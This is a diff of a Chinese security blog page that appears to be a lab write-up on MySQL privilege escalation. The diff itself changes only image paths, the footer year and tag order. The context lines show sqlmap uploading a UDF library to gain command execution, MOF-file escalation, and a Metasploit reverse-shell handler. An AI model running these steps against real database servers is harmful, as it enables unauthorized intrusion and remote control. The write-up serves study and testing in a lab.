@@ -281,7 +281,7 @@ var _hmt = _hmt || [];
 <h3 id="寻找插件目录"><a href="#寻找插件目录" class="headerlink" title="寻找插件目录"></a>寻找插件目录</h3><p><code>show veriables like &#39;%plugin&#39;;</code>没有的话要用<code>select @@basedir</code>手动查询目录然后进行创建，也可以用NTFS ADS流创建<code>select 233 into dumpfile &#39;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#39;;</code></p>
 <h3 id="写入动态链接库"><a href="#写入动态链接库" class="headerlink" title="写入动态链接库"></a>写入动态链接库</h3><p>在写入之前需要确定mysql的位数，用<code>mysql -v</code>或进入mysql中用<code>show variables like &#39;%version_%&#39;</code>，我的为64位。</p>
 <p>不然就会有下面这种情况</p>
-<p><img src="./image-20210610151439.png"></p>
+<p><img src="/2021/06/10/mysql%E6%8F%90%E6%9D%83/image-20210610151439.png"></p>
 <p>分三种情况</p>
 <h4 id="sql注入且为最高权限，plugin-目录可写且需要-secure-file-priv-无限制，MySQL-插件目录可以被-MySQL-用户写入"><a href="#sql注入且为最高权限，plugin-目录可写且需要-secure-file-priv-无限制，MySQL-插件目录可以被-MySQL-用户写入" class="headerlink" title="sql注入且为最高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入"></a>sql注入且为最高权限，plugin 目录可写且需要 secure_file_priv 无限制，MySQL 插件目录可以被 MySQL 用户写入</h4><p>直接用sqlmap上传<code>sqlmap -u &quot;http://192.168.80.130/sqli-labs/Less-11/&quot; --data=&quot;username=admin&quot; --file-write=&quot;/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so&quot; -file-dest=&quot;/usr/lib/mysql/plugin/udf.so&quot;</code></p>
 <h4 id="没有注入的话，当-secure-file-priv-无限制时也可以手工写入到plugin下"><a href="#没有注入的话，当-secure-file-priv-无限制时也可以手工写入到plugin下" class="headerlink" title="没有注入的话，当 secure_file_priv 无限制时也可以手工写入到plugin下"></a>没有注入的话，当 secure_file_priv 无限制时也可以手工写入到plugin下</h4><p>获取文件的16进制的话可以用</p>
@@ -291,7 +291,7 @@ var _hmt = _hmt || [];
 <p>（有一说一，这也太长了，不被检测到都有鬼了，而且大多数时候linux的/user/lib权限都是不够的，很困难）</p>
 <h3 id="创建自定义函数并执行命令"><a href="#创建自定义函数并执行命令" class="headerlink" title="创建自定义函数并执行命令"></a>创建自定义函数并执行命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf64.so&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">| name     | ret | dl       | type     |</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">| sys_eval |   0 | udf64.so | function |</span><br><span class="line">+----------+-----+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
 <p>（然后在<code>select sys_eval(&#39;whoami&#39;);</code>的时候失败了，我的是ubuntu14，不过在windows上搭的mysql成功了）</p>
-<p><img src="./image-20210610162109.png"></p>
+<p><img src="/2021/06/10/mysql%E6%8F%90%E6%9D%83/image-20210610162109.png"></p>
 <p>国光师傅还有两个通过这个直接拿shell的方法，我就不写了。</p>
 <h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>winserver 2003的<code>C:/Windows/system32/wbem/mof/</code>目录下的 mof 文件每 隔一段时间（几秒钟左右）都会被系统执行，因为这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了。</p>
 <h3 id="上传mof文件"><a href="#上传mof文件" class="headerlink" title="上传mof文件"></a>上传mof文件</h3><p>mof文件的内容为：</p>
@@ -321,9 +321,9 @@ var _hmt = _hmt || [];
 <p>然后再开一个窗口进行监听</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -H 192.168.80.129 -P 4444 -p windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br></pre></td></tr></table></figure>
 <p>然后就无了</p>
-<p><img src="./image-20210611154714.png"></p>
-<p><img src="./image-20210611154753.png"></p>
-<p><img src="./image-20210611154815.png"></p>
+<p><img src="/2021/06/10/mysql%E6%8F%90%E6%9D%83/image-20210611154714.png"></p>
+<p><img src="/2021/06/10/mysql%E6%8F%90%E6%9D%83/image-20210611154753.png"></p>
+<p><img src="/2021/06/10/mysql%E6%8F%90%E6%9D%83/image-20210611154815.png"></p>
 <p>点击是可以上线的，也就是说，如果你有shell且权限够的话是可以直接运行上线的。</p>
 <h2 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h2><p>这个的exp在<a target="_blank" rel="noopener" href="https://www.exploit-db.com/search?cve=2016-6663">exploit-database</a>里一下就能搜到，包括影响版本啥的，就不一一说明了。</p>
 <ol>
@@ -550,7 +550,7 @@ gitalk.render('gitalk-container')
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2021-2022 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
+    		&copy; 2021-2024 <a href="https://sn1per-ssd.github.io/" target="_blank">Sn1pEr</a>
     	</div>
       	<div class="footer-right">
 			
@@ -673,11 +673,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">漏洞复现</a>
+                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -693,23 +701,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">dedecms</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+                <a href="javascript:void(0)" class="js-tag color5">java</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+                <a href="javascript:void(0)" class="js-tag color3">范围</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">配置</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -733,6 +737,14 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">木马</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">tomcat</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">sql注入</a>
               </li>
              
@@ -753,11 +765,19 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">代理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">yii</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Misc</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -773,15 +793,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">代理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">tips</a>
+                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -789,7 +801,7 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">源码泄露</a>
+                <a href="javascript:void(0)" class="js-tag color5">tips</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -797,11 +809,15 @@ gitalk.render('gitalk-container')
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">汇编语言</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">javascript</a>
+                <a href="javascript:void(0)" class="js-tag color5">绕过方法</a>
               </li>
              
               <li class="article-tag-list-item">
